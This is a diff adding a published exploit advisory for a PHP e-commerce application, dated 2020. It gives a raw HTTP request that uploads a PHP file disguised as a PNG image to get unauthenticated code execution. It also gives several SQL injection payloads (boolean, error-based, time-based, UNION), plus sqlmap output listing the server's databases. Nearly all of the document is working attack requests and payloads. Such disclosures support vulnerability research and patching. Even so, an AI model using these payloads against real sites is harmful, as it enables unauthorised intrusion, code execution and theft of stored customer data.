@@ -1,0 +1,100 @@
+# Exploit Title: E-Commerce System 1.0 - Unauthenticated Remote Code Execution
+# Exploit Author: SunCSR (Sun* Cyber Security Research - ThienNV)
+# Date: 2020-05-14
+# Vendor Homepage: https://www.sourcecodester.com/php/13524/e-commerce-system-using-phpmysqli.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/ecommerce.zip
+# Version: 1.0
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.5
+# Description: E-Commerce System Using PHP/MySQLi - Unauthenticated Remote Code Execution + Unauthenticated SQL Injection
+
+### Description: E-Commerce System Using PHP/MySQLi - Unauthenticated
+Remote Code Execution + Unauthenticated SQL Injection
+
+###POC 1: Unauthenticated Remote Code Execution via Unrestricted file upload
+
+Vulnerabilities url: http://thiennv.com/ecommerce/index.php?q=profile
+Exploitation:
+
+POST /ecommerce/customer/controller.php?action=photos HTTP/1.1
+Host: thiennv.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0)
+Gecko/20100101 Firefox/76.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data;
+boundary=---------------------------270177040916945863071313890828
+Content-Length: 4723
+Origin: http://thiennv.com
+Connection: close
+Referer: http://thiennv.com/ecommerce/index.php?q=profile
+Cookie: advanced_ads_hide_deactivate_feedback=1; wplc_chat_status=5;
+_icl_current_language=en; nc_status=browsing; tcx_customerID=rJQlLlHFcU;
+wplc_cid=Bk4eLeHFcI_1589362760300; PHPSESSID=909kc73hdpc69l5vk6malipke7
+Upgrade-Insecure-Requests: 1
+
+-----------------------------270177040916945863071313890828
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000000
+-----------------------------270177040916945863071313890828
+Content-Disposition: form-data; name="photo"; filename="logo1.php"
+Content-Type: image/png
+
+‰PNG
+
+
+IHDR   á   á   m"H   &PLTEÝ=1ÿÿÿ
+<?php phpinfo() ?>
+-----------------------------270177040916945863071313890828
+Content-Disposition: form-data; name="savephoto"
+
+
+-----------------------------270177040916945863071313890828--
+
+###POC 2: Unauthenticated SQL Injection
+
+Vulnerabilities url:
+http://192.168.17.65:80/ecommerce/index.php?q=product&category=-2854'
+Exploitation:
+
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload:
+http://192.168.17.65:80/ecommerce/index.php?q=product&category=-2854' OR
+6075=6075#
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+    Payload: http://192.168.17.65:80/ecommerce/index.php?q=product&category='
+OR (SELECT 2158 FROM(SELECT COUNT(*),CONCAT(0x71706a7a71,(SELECT
+(ELT(2158=2158,1))),0x7170767671,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FBZp
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://192.168.17.65:80/ecommerce/index.php?q=product&category='
+AND (SELECT 5509 FROM (SELECT(SLEEP(5)))dkZy)-- vkPi
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 20 columns
+    Payload: http://192.168.17.65:80/ecommerce/index.php?q=product&category='
+UNION ALL SELECT
+NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706a7a71,0x644764427169434a594a57726f4a744c517a58554b59485152524842596454684f4d504d6d644868,0x7170767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+---
+[11:22:17] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[11:22:17] [INFO] fetching database names
+available databases [6]:
+[*] db_ecommerce
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+-------------------------------------------------------------------------------------------------------------Best
+Regards!
+(*Mr) Ngo Van Thien*
